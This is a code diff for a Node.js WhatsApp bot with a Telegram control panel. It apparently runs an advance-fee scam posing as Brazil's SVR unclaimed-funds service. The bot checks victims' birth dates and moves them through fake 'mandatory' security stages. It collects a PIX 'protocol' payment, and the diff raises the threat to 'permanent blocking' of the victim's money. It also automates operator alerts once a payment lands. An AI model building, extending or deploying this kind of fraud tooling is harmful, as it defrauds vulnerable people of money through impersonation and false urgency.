@@ -110,15 +110,15 @@ try {
         fs.unlinkSync(QUEUE_FILE);
         console.log('🗑️ [SISTEMA] Fila de leads resetada.');
     }
-    
+
     // Limpa sessão do WhatsApp para forçar novo QR Code
     // REMOVIDO: A sessão não deve ser limpa ao reiniciar o servidor para manter o bot conectado
     // if (fs.existsSync(AUTH_FOLDER)) {
     //     fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
     //     console.log(`🗑️ [SISTEMA] Sessão WhatsApp (${START_BOT_ID}) limpa. Novo QR será gerado.`);
     // }
-} catch (e) { 
-    console.error('⚠️ [SISTEMA] Erro ao resetar dados:', e.message); 
+} catch (e) {
+    console.error('⚠️ [SISTEMA] Erro ao resetar dados:', e.message);
 }
 
 let chatSessions = new Map();
@@ -309,6 +309,7 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', huma
 
     const e2Label = humanStep >= 2 ? "📞 Etapa 2 ✅" : "📞 Etapa 2 (Pendente)";
     const e3Label = humanStep >= 3 ? "🔐 Etapa 3 ✅" : "🔐 Etapa 3 (Validação)";
+    const e4Label = humanStep >= 4 ? "💳 Etapa 4 ✅" : "💳 Etapa 4 (PIX)";
 
     const reply_markup = {
         inline_keyboard: [
@@ -317,12 +318,15 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', huma
                 { text: e3Label, callback_data: `etapa:3:${chatId}` }
             ],
             [
-                { text: "⚡ PIX Automático (Gateway)", callback_data: `pix_sel:auto:${chatId}` },
+                { text: "⚡ PIX Auto (Gateway)", callback_data: `pix_sel:auto:${chatId}` },
                 { text: "🛠️ PIX Manual (Chave)", callback_data: `pix_sel:manual:${chatId}` }
             ],
             [
-                { text: "📧 Enviar E-mail Manual", callback_data: `cmd:send_email:${chatId}` },
+                { text: e4Label, callback_data: `etapa:4:${chatId}` },
                 { text: "✅ Etapa 5 (Finalizar)", callback_data: `etapa:5:${chatId}` }
+            ],
+            [
+                { text: "📧 Enviar E-mail", callback_data: `cmd:send_email:${chatId}` }
             ]
         ]
     };
@@ -358,26 +362,26 @@ client.on('qr', async (qr) => {
     const isRefreshRequested = fs.existsSync(REFRESH_FLAG);
 
     if (isRefreshRequested) {
-        try { fs.unlinkSync(REFRESH_FLAG); } catch(e) {}
+        try { fs.unlinkSync(REFRESH_FLAG); } catch (e) { }
     }
 
     try {
         const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
         const qrBuffer = await QRCode.toBuffer(qr, { width: 512, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
-        
+
         const now = new Date();
         const expiresAt = new Date(now.getTime() + 45000); // QRs do whatsapp-web.js duram aprox 45s
-        
+
         const caption = `📲 <b>QR CODE — ${slotLabel}</b>\n\n` +
-                        `Escaneie com o WhatsApp para conectar o bot.\n\n` +
-                        `⏳ <b>Gerado às:</b> ${now.toLocaleTimeString('pt-BR')}\n` +
-                        `⚠️ <b>Expira às:</b> ${expiresAt.toLocaleTimeString('pt-BR')} (Válido por 45s)\n\n` +
-                        `<i>Após este horário, o QR pode expirar. Caso não conecte, clique no botão abaixo para atualizar.</i>`;
-        const kb = { 
+            `Escaneie com o WhatsApp para conectar o bot.\n\n` +
+            `⏳ <b>Gerado às:</b> ${now.toLocaleTimeString('pt-BR')}\n` +
+            `⚠️ <b>Expira às:</b> ${expiresAt.toLocaleTimeString('pt-BR')} (Válido por 45s)\n\n` +
+            `<i>Após este horário, o QR pode expirar. Caso não conecte, clique no botão abaixo para atualizar.</i>`;
+        const kb = {
             inline_keyboard: [
                 [{ text: "🔄 Gerar Novo QR Code", callback_data: "cmd:refresh_qr" }],
                 [{ text: "📱 Mudar Número WhatsApp", callback_data: "painel:change_whatsapp_num" }]
-            ] 
+            ]
         };
 
         const form = new FormData();
@@ -411,7 +415,7 @@ client.on('ready', async () => {
         if (info && info.pushname) adminName = info.pushname;
     } catch (e) { }
     fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'CONNECTED', adminName, ts: Date.now() }));
-    
+
     const caption = `✅ <b>${BOT_ID.toUpperCase()} CONECTADO</b>\n\n📱 WhatsApp vinculado com sucesso!\nO bot está pronto para atendimento.`;
     if (lastQrMsgId) {
         // Tenta editar a mensagem do QR para a de sucesso
@@ -450,10 +454,10 @@ client.on('incoming_call', async (call) => {
         }
 
         // Tenta aceitar a chamada automaticamente (não interrompe se falhar)
-        try { await call.accept(); } catch (_) {}
+        try { await call.accept(); } catch (_) { }
     } else {
         // Lead desconhecido ligando — registra no Telegram
-        try { await call.reject(); } catch (_) {}
+        try { await call.reject(); } catch (_) { }
     }
 });
 
@@ -494,7 +498,7 @@ Verificação e habilitação da conta de destino para transferência dos valore
 *4ª Etapa — Liberação e Transferência dos Valores:* ⏳ Pendente
 Processamento final e crédito dos ativos financeiros na conta indicada pelo titular.
 
-⚠️ *IMPORTANTE:* Todas as etapas são *obrigatórias e insubstituíveis*, conforme determina o protocolo de segurança do Sistema de Valores a Receber (SVR). A não conclusão de qualquer etapa *suspende automaticamente* o processo de resgate, podendo resultar no retorno dos valores ao Fundo Garantidor.
+⚠️ *IMPORTANTE:* Todas as etapas são *obrigatórias e insubstituíveis*, conforme determina o protocolo de segurança do Sistema de Valores a Receber (SVR). A não conclusão de qualquer etapa *suspende automaticamente* o processo de resgate, podendo resultar no bloqueio permanente dos valores a serem recebidos.
 
 Nosso operador responsável conduzirá o(a) senhor(a) pelas próximas etapas de forma segura, sigilosa e dentro dos prazos legalmente estabelecidos.
 
@@ -938,7 +942,7 @@ async function processIncomingMessage(msg, targetChatId) {
     if (currentSession.step === 1) {
         // More robust date regex: matches DD/MM/YYYY, DD-MM-YYYY, or DDMMYYYY
         const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4})/) || text.match(/(\d{8})/);
-        
+
         if (!dateMatch) {
             console.log(`[BOT] Date format not recognized for ${targetChatId}: "${text}"`);
             const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
@@ -950,7 +954,7 @@ async function processIncomingMessage(msg, targetChatId) {
 
         const rawDate = dateMatch[0];
         const cleanTyped = rawDate.replace(/\D/g, "");
-        
+
         // Ensure we have exactly 8 digits (DDMMYYYY)
         if (cleanTyped.length !== 8) {
             await sendBotMessage(targetChatId, `⚠️ *Data Incompleta*\n\nPor favor, informe a data completa com dia, mês e ano (Ex: 10/05/1990).`);
@@ -979,7 +983,7 @@ async function processIncomingMessage(msg, targetChatId) {
         if (currentSession.expectedData?.birthDate) {
             const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");
             console.log(`[BOT] Comparing dates for ${targetChatId}: Typed=${cleanTyped}, Expected=${cleanExpected}`);
-            
+
             if (cleanTyped !== cleanExpected) {
                 console.log(`[BOT] DIVERGENCE: Typed ${cleanTyped} != Expected ${cleanExpected}`);
                 await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal SVR*\n\nA data informada não corresponde aos registros cadastrais do titular no portal.\n\nPor gentileza, verifique os dados e informe novamente conforme preenchido anteriormente.\n📌 *Formato:* DD/MM/AAAA`);
@@ -999,7 +1003,7 @@ async function processIncomingMessage(msg, targetChatId) {
 
         // Format for storage: DD/MM/AAAA
         const formattedDate = cleanTyped.replace(/(\d{2})(\d{2})(\d{4})/, "$1/$2/$3");
-        
+
         currentSession.step = 2;
         currentSession.birthDate = formattedDate;
         chatSessions.set(targetChatId, currentSession);
@@ -1193,7 +1197,7 @@ setInterval(async () => {
         }
     }
 
-    // --- cmd-etapa-*.json: libera etapas 3 e 4 ao lead ---
+    // --- cmd-etapa-*.json: libera etapas ao lead e atualiza painel Telegram INSTANTANEAMENTE ---
     const etapaFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-etapa-') && f.endsWith('.json'));
     for (const file of etapaFiles) {
         const cmdPath = path.join(process.cwd(), file);
@@ -1205,29 +1209,45 @@ setInterval(async () => {
 
         if (cmd) {
             try {
-                fs.unlinkSync(cmdPath); // Apaga antes de processar
+                fs.unlinkSync(cmdPath);
                 const { etapa, chatId } = cmd;
                 const session = chatSessions.get(chatId);
 
                 console.log(`📋 [ETAPA ${etapa}] Liberando para: ${chatId}`);
 
-                if (etapa === 3) {
+                if (etapa === 2) {
+                    if (session) { session.humanStep = 2; chatSessions.set(chatId, session); saveSessions(); }
+                    // Atualiza painel do lead no Telegram imediatamente (fica verde)
+                    if (session?.tgMsgId) {
+                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 2);
+                        await notifyTelegram(t, session.tgMsgId, r);
+                    }
+                    await sendBotMessage(chatId, MENSAGEM_ETAPA_2_CONCLUIDA);
+
+                } else if (etapa === 3) {
                     if (session) { session.humanStep = 3; chatSessions.set(chatId, session); saveSessions(); }
+                    // Atualiza painel do lead no Telegram imediatamente (Etapa 3 fica verde)
+                    if (session?.tgMsgId) {
+                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 3);
+                        await notifyTelegram(t, session.tgMsgId, r);
+                    }
                     await sendBotMessage(chatId, MENSAGEM_ETAPA_3);
-                    // Notifica Telegram com botão para Etapa 4
-                    await notifyTelegram(
-                        `📋 <b>ETAPA 3 LIBERADA!</b>\nLead: <code>${chatId}</code>\n\n<i>Use /pix para gerar o protocolo e avançar para Etapa 4.</i>`
-                    );
+
                 } else if (etapa === 4) {
                     if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
+                    // Atualiza painel do lead no Telegram imediatamente (Etapa 4 fica verde)
+                    if (session?.tgMsgId) {
+                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 4);
+                        await notifyTelegram(t, session.tgMsgId, r);
+                    }
                     await sendBotMessage(chatId, MENSAGEM_ETAPA_4);
-                    await notifyTelegram(
-                        `🔐 <b>ETAPA 4 — PROTOCOLO ATIVO</b>\nLead: <code>${chatId}</code>\n\n<i>Aguardando detecção de validação do hash bancário.</i>`,
-                        undefined,
-                        { inline_keyboard: [[{ text: '💰 Liberar Etapa 5 Manual', callback_data: `etapa:5:${chatId}` }]] }
-                    );
+
                 } else if (etapa === 5) {
                     if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
+                    if (session?.tgMsgId) {
+                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 5);
+                        await notifyTelegram(t, session.tgMsgId, r);
+                    }
                     await sendBotMessage(chatId, MENSAGEM_ETAPA_5);
                     await notifyTelegram(
                         `💰 <b>ETAPA 5 — LIBERAÇÃO FINAL</b>\nLead: <code>${chatId}</code>\n\n<i>Lead em fase de preenchimento dos dados de crédito.</i>`
@@ -1235,6 +1255,50 @@ setInterval(async () => {
                 }
             } catch (e) {
                 console.error("❌ Erro ao processar cmd-etapa:", e.message);
+            }
+        }
+    }
+
+    // --- cmd-pix-paid-*.json: PIX automático foi PAGO → conclui Etapa 4 automaticamente ---
+    const paidFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-pix-paid-') && f.endsWith('.json'));
+    for (const file of paidFiles) {
+        const cmdPath = path.join(process.cwd(), file);
+        let cmd = null;
+        try {
+            const data = fs.readFileSync(cmdPath, 'utf-8');
+            if (data) cmd = JSON.parse(data);
+        } catch (e) { continue; }
+
+        if (cmd) {
+            try {
+                fs.unlinkSync(cmdPath);
+                const { chatId, transId } = cmd;
+                const session = chatSessions.get(chatId);
+
+                console.log(`💰 [PIX PAGO] Etapa 4 concluída automaticamente para: ${chatId} | TransID: ${transId}`);
+
+                if (session) {
+                    session.humanStep = 4;
+                    chatSessions.set(chatId, session);
+                    saveSessions();
+
+                    // Atualiza painel Telegram — Etapa 4 fica verde automaticamente
+                    if (session.tgMsgId) {
+                        const { text: t, reply_markup: r } = buildCadastroMessage(chatId, session.name, session.birthDate, 'human', session.docType || 'CPF', 4);
+                        await notifyTelegram(t, session.tgMsgId, r);
+                    }
+
+                    // Notifica admin sobre o pagamento
+                    await notifyTelegram(
+                        `✅ <b>PIX PAGO — ETAPA 4 CONCLUÍDA AUTOMATICAMENTE!</b>\n\nLead: <code>${chatId}</code>\nTransação: <code>${transId}</code>\n\n<i>O lead efetuou o pagamento do protocolo. Libere a Etapa 5 quando quiser.</i>`,
+                        undefined,
+                        { inline_keyboard: [[{ text: '✅ Liberar Etapa 5', callback_data: `etapa:5:${chatId}` }]] }
+                    );
+
+                    await sendBotMessage(chatId, MENSAGEM_ETAPA_4);
+                }
+            } catch (e) {
+                console.error("❌ Erro ao processar cmd-pix-paid:", e.message);
             }
         }
     }
